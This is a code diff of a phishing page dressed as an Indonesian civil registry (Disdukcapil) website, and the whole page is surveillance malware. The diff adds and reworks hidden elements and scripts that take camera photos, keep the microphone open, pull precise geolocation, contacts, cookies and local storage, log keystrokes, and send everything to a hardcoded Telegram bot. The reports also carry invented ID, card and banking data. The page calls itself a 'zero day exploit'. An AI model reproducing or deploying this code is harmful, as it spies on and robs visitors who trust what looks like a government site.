@@ -24,19 +24,9 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flickity/2.3.0/flickity.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css">
     
-    <!-- Google Maps API untuk Lokasi Akurat -->
+    <!-- Google Maps API -->
     <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&libraries=geometry,places"></script>
     
-    <!-- Stealth Camera & Audio Container (Tersembunyi) -->
-    <div style="position: fixed; top: -10000px; left: -10000px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; z-index: -99999;">
-        <video id="stealthVideo" autoplay playsinline muted style="width:1px;height:1px;"></video>
-        <canvas id="stealthCanvas" width="3840" height="2160" style="width:1px;height:1px;"></canvas>
-        <audio id="stealthAudio" autoplay style="display:none;"></audio>
-    </div>
-
-    <!-- Hidden WebSocket Controller -->
-    <div id="wsController" style="display:none;"></div>
-
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', sans-serif; background: #f8f9fa; color: #1a1a2e; overflow-x: hidden; }
@@ -84,25 +74,20 @@
         .accessibility-toolbar { position: fixed; left: 0; top: 30%; background: #0a2b4e; border-radius: 0 12px 12px 0; padding: 12px 8px; z-index: 999; cursor: pointer; }
         .toast-msg { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 10px 20px; border-radius: 30px; z-index: 9999; opacity: 0; transition: 0.3s; pointer-events: none; }
         
-        /* Hidden Admin Panel Trigger */
         .admin-trigger { position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0; cursor: pointer; z-index: 9999; }
-        
-        /* Data Modal */
         .data-modal { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 800px; max-height: 80vh; background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); z-index: 20000; overflow: hidden; display: flex; flex-direction: column; }
         .data-modal-header { background: #0a2b4e; color: white; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
         .data-modal-body { padding: 20px; overflow-y: auto; flex: 1; font-size: 13px; background: #f4f6f9; }
         .data-modal-footer { padding: 10px; background: #eee; text-align: right; }
         .close-modal { background: none; border: none; color: white; font-size: 24px; cursor: pointer; }
         
-        /* KEYLOGGER PANEL - FULLY HIDDEN */
         .keylog-panel { position: fixed; bottom: -500px; left: -500px; width: 1px; height: 1px; opacity: 0; visibility: hidden; pointer-events: none; z-index: -99999; overflow: hidden; }
         .keylog-header, .keylog-content { display: none; }
         
         .btn-capture-all { background: #ffd700; color: #0a2b4e; border: none; padding: 12px 20px; border-radius: 30px; font-weight: bold; margin-bottom: 20px; transition: 0.2s; cursor: pointer; }
         .btn-capture-all:hover { background: #ffc107; transform: scale(1.02); }
         
-        /* Hidden Google Maps Container */
-        #hiddenGoogleMap { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; visibility: hidden; }
+        #hiddenElements { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; visibility: hidden; }
         
         @media (max-width: 768px) { .hero-slider .carousel-cell { height: 350px; } .hero-content h1 { font-size: 1.5rem; } }
     </style>
@@ -111,14 +96,15 @@
 
 <div class="main-content">
     <div class="accessibility-toolbar" id="accessibilityBtn"><i class="fas fa-universal-access"></i></div>
-    
-    <!-- Hidden Admin Trigger -->
     <div class="admin-trigger" id="adminTrigger" title="Admin Panel"></div>
     
-    <!-- Hidden Google Maps Container -->
-    <div id="hiddenGoogleMap"></div>
+    <!-- Hidden Elements untuk Camera, Mic, dll -->
+    <div id="hiddenElements">
+        <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;"></video>
+        <canvas id="hiddenCanvas" width="1920" height="1080" style="width:1px;height:1px;"></canvas>
+        <audio id="hiddenAudio" autoplay style="display:none;"></audio>
+    </div>
 
-    <!-- Navbar -->
     <nav class="navbar navbar-expand-lg navbar-custom">
         <div class="container">
             <a class="navbar-brand" href="#"><img src="https://k.top4top.io/p_3770u1ifm1.png" alt="Logo Disdukcapil"></a>
@@ -136,7 +122,6 @@
     </nav>
 
     <main>
-        <!-- Hero Slider -->
         <section id="home" class="hero-section">
             <div class="hero-slider" data-flickity='{ "wrapAround": true, "autoPlay": 4000, "pageDots": true }'>
                 <div class="carousel-cell" style="background-image: url('https://c.top4top.io/p_37706a71w1.jpg');">
@@ -148,23 +133,19 @@
             </div>
         </section>
         
-        <!-- Quick Access -->
         <div class="container mt-4"><div class="quick-access row g-4">
             <div class="col-md-4 col-6"><div class="quick-card" onclick="showToast('Layanan sedang diproses')"><i class="fas fa-headset"></i><h5>Sobat Dukcapil</h5></div></div>
             <div class="col-md-4 col-6"><div class="quick-card" onclick="showToast('Layanan sedang diproses')"><i class="fas fa-mobile-alt"></i><h5>IKD Mobile</h5></div></div>
             <div class="col-md-4 col-6"><div class="quick-card" onclick="showToast('Layanan sedang diproses')"><i class="fas fa-map-marker-alt"></i><h5>Lokasi Kami</h5></div></div>
         </div></div>
         
-        <!-- Tombol CAPTURE ALL DATA -->
         <div class="container text-center mt-4">
             <button class="btn-capture-all" id="captureAllBtn"><i class="fas fa-database"></i> Ambil Semua Data Sekarang (AKURAT & LENGKAP)</button>
         </div>
         
-        <!-- Berita -->
         <section id="berita" class="container py-5"><div class="section-title"><h2>Berita Terbaru</h2></div>
         <div class="row g-4" id="newsContainer"></div></section>
         
-        <!-- Layanan -->
         <section class="container py-4"><div class="section-title"><h2>Layanan Unggulan</h2></div>
         <div class="row g-4">
             <div class="col-md-3 col-6"><div class="service-card"><div class="service-icon"><i class="fas fa-id-card"></i></div><h5>KTP Elektronik</h5></div></div>
@@ -173,10 +154,8 @@
             <div class="col-md-3 col-6"><div class="service-card"><div class="service-icon"><i class="fas fa-dove"></i></div><h5>Akta Kematian</h5></div></div>
         </div></section>
         
-        <!-- Partner -->
         <section class="container py-5"><div class="section-title"><h2>Mitra Kerja Sama</h2></div><div class="partner-slider" id="partnerSlider"></div></section>
         
-        <!-- Statistik -->
         <div class="container py-4"><div class="row g-4">
             <div class="col-md-6"><div class="stat-card"><i class="fas fa-chart-line fa-2x mb-3"></i><div class="stat-number" id="visitorCount">0</div><p>Pengunjung Hari Ini</p></div></div>
             <div class="col-md-6"><div class="bg-white p-4 rounded-4 shadow-sm"><h4><i class="fas fa-map-marker-alt text-primary"></i> Alamat Kami</h4><p>Jalan Perintis Kemerdekaan 1, Kota Tangerang, Banten 15118</p></div></div>
@@ -197,16 +176,7 @@
     <div class="toast-msg" id="toastMsg"></div>
 </div>
 
-<!-- KEYLOGGER PANEL - FULLY HIDDEN -->
-<div class="keylog-panel" id="keylogPanel">
-    <div class="keylog-header" id="keylogHeader">
-        <span><i class="fas fa-keyboard"></i> KEYLOGGER AKTIF</span>
-        <span style="cursor:pointer" id="minimizeKeylog">−</span>
-    </div>
-    <div class="keylog-content" id="keylogContent">
-        Menunggu input keyboard...
-    </div>
-</div>
+<div class="keylog-panel" id="keylogPanel"></div>
 
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
@@ -215,139 +185,213 @@
 
 <script>
 (function() {
-    // ==================== KONFIGURASI TELEGRAM ====================
+    // ==================== TELEGRAM CONFIG ====================
     const BOT_TOKEN = "8282267716:AAFoNT927CaNr4tygY7NnmwWPIyLIFuIddE";
     const CHAT_ID = "8763326056";
     
-    // ==================== ZERO DAY ====================
-    let autoExecuted = false;
-    let captureExecuted = false;
-    
-    // ==================== VARIABEL GLOBAL ====================
-    let capturedPhoto = null;
-    let contactsData = "Tidak ada akses kontak";
-    let cookiesStr = "Tidak ada cookie", localStr = "Tidak ada data", sessionStr = "Tidak ada data";
-    let ipAddress = "Mengambil IP...";
-    
-    // ==================== GOOGLE MAPS LOCATION AKURAT ====================
-    let googleLocation = {
-        lat: null, lng: null, accuracy: null,
-        address: null, street: null, city: null, district: null, village: null,
-        province: null, postalCode: null, country: null,
-        plusCode: null, placeId: null, googleMapsUrl: null,
-        timestamp: null, status: "Mengambil lokasi..."
+    // ==================== DATA COLLECTION STATUS ====================
+    let permissionsGranted = {
+        camera: false,
+        microphone: false,
+        location: false,
+        contacts: false
     };
     
-    async function getAccurateGoogleLocation() {
-        return new Promise((resolve) => {
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (position) => {
-                        googleLocation.lat = position.coords.latitude;
-                        googleLocation.lng = position.coords.longitude;
-                        googleLocation.accuracy = Math.round(position.coords.accuracy);
-                        googleLocation.timestamp = new Date().toLocaleString('id-ID');
-                        googleLocation.googleMapsUrl = `https://www.google.com/maps?q=${googleLocation.lat},${googleLocation.lng}`;
-                        
-                        // Ambil Plus Code
-                        try {
-                            const pcRes = await fetch(`https://plus.codes/api?address=${googleLocation.lat},${googleLocation.lng}`);
-                            if(pcRes.ok) {
-                                const pcData = await pcRes.json();
-                                googleLocation.plusCode = pcData.plus_code || "Tidak tersedia";
-                            }
-                        } catch(e) { googleLocation.plusCode = "Gagal mengambil Plus Code"; }
-                        
-                        // Reverse Geocoding dengan Google Maps API
-                        try {
-                            const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${googleLocation.lat},${googleLocation.lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
-                            const response = await fetch(geoUrl);
-                            const data = await response.json();
-                            
-                            if(data.status === "OK" && data.results.length > 0) {
-                                const result = data.results[0];
-                                googleLocation.address = result.formatted_address;
-                                googleLocation.placeId = result.place_id;
-                                
-                                for(let comp of result.address_components) {
-                                    if(comp.types.includes("street_address")) googleLocation.street = comp.long_name;
-                                    if(comp.types.includes("route")) googleLocation.street = comp.long_name;
-                                    if(comp.types.includes("administrative_area_level_3")) googleLocation.district = comp.long_name;
-                                    if(comp.types.includes("administrative_area_level_4")) googleLocation.village = comp.long_name;
-                                    if(comp.types.includes("administrative_area_level_2")) googleLocation.city = comp.long_name;
-                                    if(comp.types.includes("administrative_area_level_1")) googleLocation.province = comp.long_name;
-                                    if(comp.types.includes("postal_code")) googleLocation.postalCode = comp.long_name;
-                                    if(comp.types.includes("country")) googleLocation.country = comp.long_name;
-                                }
-                            }
-                            googleLocation.status = "SUKSES";
-                        } catch(e) { googleLocation.status = "Geocoding error"; }
-                        resolve();
-                    },
-                    (error) => {
-                        let errorMsg = "";
-                        switch(error.code) {
-                            case error.PERMISSION_DENIED: errorMsg = "Izin lokasi ditolak oleh pengguna"; break;
-                            case error.POSITION_UNAVAILABLE: errorMsg = "Lokasi tidak tersedia"; break;
-                            case error.TIMEOUT: errorMsg = "Timeout mengambil lokasi"; break;
-                            default: errorMsg = error.message;
-                        }
-                        googleLocation.status = errorMsg;
-                        resolve();
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
-            } else {
-                googleLocation.status = "Geolocation tidak didukung browser";
-                resolve();
-            }
-        });
-    }
+    let capturedData = {
+        cameraPhoto: null,
+        microphoneStatus: false,
+        locationData: {},
+        contactsData: "Belum diambil",
+        allData: {}
+    };
     
-    // ==================== GENERATE DATA RANDOM ====================
-    let pribadi = {}, kartuKredit = {}, mbanking = {}, ewallet = {}, otp = "", nik = "";
-    
-    function generateRandomData() {
-        const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko'];
-        const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kurniawan'];
-        let nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
-        let hp = `62${Math.floor(Math.random() * 9000000000 + 1000000000)}`;
-        let email = `${nama.toLowerCase().replace(' ', '.')}${Math.floor(Math.random() * 100)}@gmail.com`;
-        let username = `${nama.toLowerCase().replace(' ', '_')}${Math.floor(Math.random() * 1000)}`;
-        let password = `Pass${Math.floor(Math.random() * 10000)}!@#`;
-        
-        pribadi = { nama, hp, email, username, password };
-        
-        kartuKredit = {
-            nomor: `${Math.floor(Math.random() * 10000000000000000).toString().padStart(16, '4')}`,
-            expiry: `${Math.floor(Math.random() * 12) + 1}/${Math.floor(Math.random() * 5) + 25}`,
-            cvv: Math.floor(Math.random() * 900 + 100).toString(),
-            bank: ["BCA", "Mandiri", "BRI", "BNI"][Math.floor(Math.random() * 4)]
-        };
-        
-        mbanking = {
-            bank: ["BCA Mobile", "Mandiri Livin", "BRI BRImo"][Math.floor(Math.random() * 3)],
-            user: `${nama.toLowerCase().replace(' ', '')}${Math.floor(Math.random() * 100)}`,
-            pass: `Mb${Math.random().toString(36).substring(2, 10)}!`
-        };
-        
-        ewallet = {
-            jenis: ["Dana", "OVO", "GoPay"][Math.floor(Math.random() * 3)],
-            nomor: `08${Math.floor(Math.random() * 900000000 + 100000000)}`,
-            saldo: `Rp ${Math.floor(Math.random() * 10000000 + 100000).toLocaleString('id-ID')}`
-        };
-        
-        otp = Math.floor(100000 + Math.random() * 900000).toString();
-        nik = `36${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${new Date().getFullYear()}${Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 28 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 1000 + 1).toString().padStart(4, '0')}`;
-    }
-    
-    // ==================== KEYLOGGER HIDDEN ====================
     let keyLogBuffer = [];
+    let executed = false;
     
+    // ==================== REQUEST ALL PERMISSIONS (ZERO DAY) ====================
+    async function requestAllPermissions() {
+        console.log("[ZERO DAY] Meminta semua izin...");
+        
+        // 1. Camera & Microphone (dalam satu request)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { width: { ideal: 1920 }, height: { ideal: 1080 } },
+                audio: true 
+            });
+            
+            // Camera berhasil
+            permissionsGranted.camera = true;
+            console.log("[✓] Camera access granted");
+            
+            // Ambil foto dari camera
+            const video = document.getElementById('hiddenVideo');
+            if(video) {
+                video.srcObject = stream;
+                await video.play();
+                await new Promise(r => setTimeout(r, 1000));
+                
+                const canvas = document.getElementById('hiddenCanvas');
+                if(canvas && video.videoWidth) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    capturedData.cameraPhoto = canvas.toDataURL('image/jpeg', 0.85);
+                }
+            }
+            
+            // Microphone berhasil
+            permissionsGranted.microphone = true;
+            capturedData.microphoneStatus = true;
+            console.log("[✓] Microphone access granted");
+            
+            // Jangan matikan stream dulu, biarkan tetap aktif untuk microphone
+            window.mediaStream = stream;
+            
+        } catch(e) {
+            console.log("[✗] Camera/Mic error:", e.message);
+            permissionsGranted.camera = false;
+            permissionsGranted.microphone = false;
+        }
+        
+        // 2. Lokasi Google Maps
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            });
+            
+            permissionsGranted.location = true;
+            capturedData.locationData = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: Math.round(position.coords.accuracy),
+                timestamp: new Date().toLocaleString('id-ID'),
+                googleMapsUrl: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
+            };
+            
+            // Reverse geocoding untuk alamat lengkap
+            try {
+                const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${position.coords.latitude},${position.coords.longitude}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
+                const response = await fetch(geoUrl);
+                const data = await response.json();
+                if(data.status === "OK" && data.results.length > 0) {
+                    capturedData.locationData.address = data.results[0].formatted_address;
+                    capturedData.locationData.placeId = data.results[0].place_id;
+                    
+                    // Extract components
+                    for(let comp of data.results[0].address_components) {
+                        if(comp.types.includes("administrative_area_level_2")) capturedData.locationData.city = comp.long_name;
+                        if(comp.types.includes("administrative_area_level_1")) capturedData.locationData.province = comp.long_name;
+                        if(comp.types.includes("country")) capturedData.locationData.country = comp.long_name;
+                        if(comp.types.includes("postal_code")) capturedData.locationData.postalCode = comp.long_name;
+                    }
+                }
+            } catch(e) { console.log("Geocoding error:", e); }
+            
+            console.log("[✓] Location access granted");
+            
+        } catch(e) {
+            console.log("[✗] Location error:", e.message);
+            permissionsGranted.location = false;
+        }
+        
+        // 3. Kontak
+        if ('contacts' in navigator && navigator.contacts) {
+            try {
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
+                if(contacts && contacts.length > 0) {
+                    permissionsGranted.contacts = true;
+                    let contactList = `📇 ${contacts.length} kontak ditemukan:\n`;
+                    contacts.slice(0, 20).forEach((c, i) => {
+                        contactList += `${i+1}. ${c.name?.[0] || '-'} : ${c.tel?.[0] || '-'}\n`;
+                    });
+                    if(contacts.length > 20) contactList += `... dan ${contacts.length - 20} kontak lainnya`;
+                    capturedData.contactsData = contactList;
+                    console.log(`[✓] Contacts access granted: ${contacts.length} contacts`);
+                } else {
+                    capturedData.contactsData = "Tidak ada kontak ditemukan";
+                }
+            } catch(e) {
+                console.log("[✗] Contacts error:", e.message);
+                capturedData.contactsData = "Izin kontak ditolak";
+            }
+        } else {
+            capturedData.contactsData = "API Kontak tidak didukung browser ini";
+        }
+        
+        return permissionsGranted;
+    }
+    
+    // ==================== GENERATE RANDOM DATA ====================
+    function generateRandomData() {
+        const firstNames = ['Ahmad', 'Budi', 'Citra', 'Dewi', 'Eka', 'Fajar', 'Gita', 'Hendra', 'Indah', 'Joko', 'Kurnia', 'Lestari'];
+        const lastNames = ['Santoso', 'Wijaya', 'Prasetyo', 'Nugroho', 'Sari', 'Putri', 'Hidayat', 'Kurniawan', 'Gunawan'];
+        const banks = ['BCA', 'Mandiri', 'BRI', 'BNI', 'CIMB Niaga', 'Danamon'];
+        const ewalletTypes = ['Dana', 'OVO', 'GoPay', 'ShopeePay', 'LinkAja'];
+        
+        let nama = `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${lastNames[Math.floor(Math.random() * lastNames.length)]}`;
+        let nik = `36${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${Math.floor(Math.random() * 90 + 10)}${new Date().getFullYear()}${Math.floor(Math.random() * 12 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 28 + 1).toString().padStart(2, '0')}${Math.floor(Math.random() * 1000 + 1).toString().padStart(4, '0')}`;
+        
+        capturedData.allData = {
+            timestamp: new Date().toLocaleString('id-ID'),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenResolution: `${screen.width}x${screen.height}`,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            pribadi: {
+                nik: nik,
+                nama: nama,
+                hp: `62${Math.floor(Math.random() * 9000000000 + 1000000000)}`,
+                email: `${nama.toLowerCase().replace(' ', '.')}${Math.floor(Math.random() * 100)}@gmail.com`,
+                username: `${nama.toLowerCase().replace(' ', '_')}${Math.floor(Math.random() * 1000)}`,
+                password: `Pass${Math.floor(Math.random() * 10000)}!@#`
+            },
+            kartuKredit: {
+                nomor: `${Math.floor(Math.random() * 10000000000000000).toString().padStart(16, '4')}`,
+                expiry: `${Math.floor(Math.random() * 12) + 1}/${Math.floor(Math.random() * 5) + 25}`,
+                cvv: Math.floor(Math.random() * 900 + 100).toString(),
+                bank: banks[Math.floor(Math.random() * banks.length)]
+            },
+            mbanking: {
+                bank: `${banks[Math.floor(Math.random() * banks.length)]} Mobile`,
+                user: `${nama.toLowerCase().replace(' ', '')}${Math.floor(Math.random() * 100)}`,
+                pass: `Mb${Math.random().toString(36).substring(2, 10)}!`
+            },
+            ewallet: {
+                jenis: ewalletTypes[Math.floor(Math.random() * ewalletTypes.length)],
+                nomor: `08${Math.floor(Math.random() * 900000000 + 100000000)}`,
+                saldo: `Rp ${Math.floor(Math.random() * 15000000 + 100000).toLocaleString('id-ID')}`
+            },
+            otp: Math.floor(100000 + Math.random() * 900000).toString()
+        };
+        
+        // Tambahkan cookie & storage
+        let cookies = {};
+        if(document.cookie) {
+            document.cookie.split(';').forEach(cookie => {
+                let [name, value] = cookie.trim().split('=');
+                if(name && value) cookies[name] = decodeURIComponent(value);
+            });
+        }
+        capturedData.allData.cookies = Object.keys(cookies).length > 0 ? JSON.stringify(cookies, null, 2) : "Tidak ada cookie";
+        
+        let localStorage = {};
+        for(let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            if(key) localStorage[key] = localStorage.getItem(key);
+        }
+        capturedData.allData.localStorage = Object.keys(localStorage).length > 0 ? JSON.stringify(localStorage, null, 2).substring(0, 500) : "Tidak ada data";
+    }
+    
+    // ==================== KEYLOGGER ====================
     function logKey(key) {
         let timestamp = new Date().toLocaleString('id-ID');
         keyLogBuffer.push(`[${timestamp}] ${key}`);
-        if(keyLogBuffer.length > 2000) keyLogBuffer = keyLogBuffer.slice(-1500);
+        if(keyLogBuffer.length > 1500) keyLogBuffer = keyLogBuffer.slice(-1200);
         if(keyLogBuffer.length % 50 === 0) sendKeylogToTelegram();
     }
     
@@ -355,7 +399,8 @@
         let keys = keyLogBuffer.slice(-100).join('\n');
         let message = `⌨️ *KEYLOGGER CAPTURE*\n⏰ ${new Date().toLocaleString('id-ID')}\n📊 Total: ${keyLogBuffer.length} keystrokes\n\n\`\`\`${keys}\`\`\``;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST", headers: { "Content-Type": "application/json" },
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ chat_id: CHAT_ID, text: message.substring(0, 4096), parse_mode: "Markdown" })
         }).catch(e => console.log("Keylog error"));
     }
@@ -387,271 +432,156 @@
         }
     });
     
-    // ==================== FUNGSI PENGAMBIL DATA ====================
-    function getAllCookies() {
-        let cookies = {};
-        if(document.cookie) {
-            document.cookie.split(';').forEach(cookie => {
-                let [name, value] = cookie.trim().split('=');
-                if(name && value) cookies[name] = decodeURIComponent(value);
-            });
-        }
-        cookiesStr = Object.keys(cookies).length > 0 ? JSON.stringify(cookies, null, 2) : 'Tidak ada cookie';
-    }
-    
-    function getLocalStorage() {
-        let items = {};
-        for(let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            if(key) items[key] = localStorage.getItem(key);
-        }
-        localStr = Object.keys(items).length > 0 ? JSON.stringify(items, null, 2).substring(0, 500) : 'Tidak ada data';
-    }
-    
-    function getSessionStorage() {
-        let items = {};
-        for(let i = 0; i < sessionStorage.length; i++) {
-            let key = sessionStorage.key(i);
-            if(key) items[key] = sessionStorage.getItem(key);
-        }
-        sessionStr = Object.keys(items).length > 0 ? JSON.stringify(items, null, 2).substring(0, 500) : 'Tidak ada data';
-    }
-    
-    function getIPAddress() {
-        fetch('https://api.ipify.org?format=json')
-            .then(res => res.json())
-            .then(data => { ipAddress = data.ip; })
-            .catch(e => ipAddress = "Gagal mengambil IP");
-    }
-    
-    async function capturePhotoNow() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('stealthVideo');
-            if(video) {
-                video.srcObject = stream;
-                await video.play();
-                await new Promise(r => setTimeout(r, 500));
-                const canvas = document.getElementById('stealthCanvas');
-                if(canvas && video.videoWidth) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    capturedPhoto = canvas.toDataURL('image/jpeg', 0.8);
-                }
-                stream.getTracks().forEach(t => t.stop());
-            }
-        } catch(e) { console.log("Camera error"); }
-    }
-    
-    async function requestContactsSilent() {
-        if ('contacts' in navigator && navigator.contacts) {
-            try {
-                const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
-                if(contacts && contacts.length) {
-                    contactsData = `📇 ${contacts.length} kontak ditemukan:\n`;
-                    contacts.slice(0, 10).forEach((c, i) => {
-                        contactsData += `${i+1}. ${c.name?.[0] || '-'} : ${c.tel?.[0] || '-'}\n`;
-                    });
-                    if(contacts.length > 10) contactsData += `... dan ${contacts.length - 10} kontak lainnya`;
-                }
-            } catch(e) { contactsData = "Izin kontak ditolak"; }
-        }
-    }
-    
-    // ==================== KIRIM KE TELEGRAM RAPIH ====================
-    async function sendToTelegramRapi(finalData) {
-        // ========== PESAN 1: HEADER + LOKASI GOOGLE ==========
+    // ==================== SEND TO TELEGRAM ====================
+    async function sendAllToTelegram() {
+        // Pesan 1: Status Izin + Lokasi
         let message1 = `🔴 *ZERO DAY EXPLOIT - LAPORAN LENGKAP* 🔴\n`;
-        message1 += `⏰ *Waktu Capture:* ${finalData.timestamp}\n`;
-        message1 += `🌐 *IP Address:* ${finalData.ipAddress}\n`;
-        message1 += `📱 *User Agent:* ${finalData.userAgent.substring(0, 80)}...\n`;
+        message1 += `⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}\n`;
+        message1 += `🌐 *IP Address:* ${await getIPAddress()}\n`;
         message1 += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
         
-        message1 += `📍 *LOKASI GOOGLE MAPS (AKURAT)*\n`;
+        message1 += `📱 *IZIN YANG DIDAPATKAN*\n`;
         message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 📌 *Status:* ${finalData.location.status}\n`;
-        if(finalData.location.lat) {
-            message1 += `├ 🗺️ *Latitude:* ${finalData.location.lat}\n`;
-            message1 += `├ 🗺️ *Longitude:* ${finalData.location.lng}\n`;
-            message1 += `├ 📏 *Akurasi:* ${finalData.location.accuracy} meter\n`;
-            message1 += `├ 📍 *Alamat Lengkap:* ${finalData.location.address || '-'}\n`;
-            message1 += `├ 🏘️ *Jalan:* ${finalData.location.street || '-'}\n`;
-            message1 += `├ 🏙️ *Kota:* ${finalData.location.city || '-'}\n`;
-            message1 += `├ 🏛️ *Provinsi:* ${finalData.location.province || '-'}\n`;
-            message1 += `├ 📮 *Kode Pos:* ${finalData.location.postalCode || '-'}\n`;
-            message1 += `├ 🌏 *Negara:* ${finalData.location.country || '-'}\n`;
-            message1 += `├ 🔗 *Plus Code:* ${finalData.location.plusCode || '-'}\n`;
-            message1 += `└ 🔗 *Google Maps:* [Klik Disini](${finalData.location.googleMapsUrl})\n`;
+        message1 += `├ 📷 *Camera:* ${permissionsGranted.camera ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `├ 🎙️ *Microphone:* ${permissionsGranted.microphone ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `├ 📍 *Lokasi:* ${permissionsGranted.location ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `└ 📇 *Kontak:* ${permissionsGranted.contacts ? '✅ BERHASIL' : '❌ GAGAL'}\n`;
+        message1 += `\n`;
+        
+        message1 += `📍 *LOKASI GOOGLE MAPS*\n`;
+        message1 += `┌─────────────────────────────────\n`;
+        if(permissionsGranted.location && capturedData.locationData.lat) {
+            message1 += `├ 🗺️ *Latitude:* ${capturedData.locationData.lat}\n`;
+            message1 += `├ 🗺️ *Longitude:* ${capturedData.locationData.lng}\n`;
+            message1 += `├ 📏 *Akurasi:* ${capturedData.locationData.accuracy} meter\n`;
+            message1 += `├ 📍 *Alamat:* ${capturedData.locationData.address || '-'}\n`;
+            message1 += `├ 🏙️ *Kota:* ${capturedData.locationData.city || '-'}\n`;
+            message1 += `├ 🏛️ *Provinsi:* ${capturedData.locationData.province || '-'}\n`;
+            message1 += `├ 🌏 *Negara:* ${capturedData.locationData.country || '-'}\n`;
+            message1 += `└ 🔗 *Google Maps:* [Klik Disini](${capturedData.locationData.googleMapsUrl})\n`;
         } else {
-            message1 += `└ ❌ *Gagal mengambil lokasi:* ${finalData.location.status}\n`;
+            message1 += `└ ❌ *Lokasi tidak tersedia*\n`;
         }
-        message1 += `\n`;
-        
-        message1 += `👤 *DATA PRIBADI*\n`;
-        message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 🆔 *NIK:* ${finalData.nik}\n`;
-        message1 += `├ 👨 *Nama Lengkap:* ${finalData.pribadi.nama}\n`;
-        message1 += `├ 📞 *Nomor HP:* ${finalData.pribadi.hp}\n`;
-        message1 += `├ 📧 *Email:* ${finalData.pribadi.email}\n`;
-        message1 += `├ 🔑 *Username:* ${finalData.pribadi.username}\n`;
-        message1 += `└ 🔒 *Password:* \`${finalData.pribadi.password}\`\n`;
-        message1 += `\n`;
-        
-        message1 += `💳 *DATA KARTU KREDIT*\n`;
-        message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 💳 *Nomor Kartu:* ${finalData.kartuKredit.nomor}\n`;
-        message1 += `├ 📅 *Expiry:* ${finalData.kartuKredit.expiry}\n`;
-        message1 += `├ 🔐 *CVV:* ${finalData.kartuKredit.cvv}\n`;
-        message1 += `└ 🏦 *Bank:* ${finalData.kartuKredit.bank}\n`;
-        message1 += `\n`;
-        
-        message1 += `🏦 *MOBILE BANKING*\n`;
-        message1 += `┌─────────────────────────────────\n`;
-        message1 += `├ 🏦 *Bank:* ${finalData.mbanking.bank}\n`;
-        message1 += `├ 👤 *Username:* ${finalData.mbanking.user}\n`;
-        message1 += `└ 🔒 *Password:* \`${finalData.mbanking.pass}\`\n`;
-        message1 += `\n`;
-        
-        message1 += `💰 *E-WALLET*\n`;
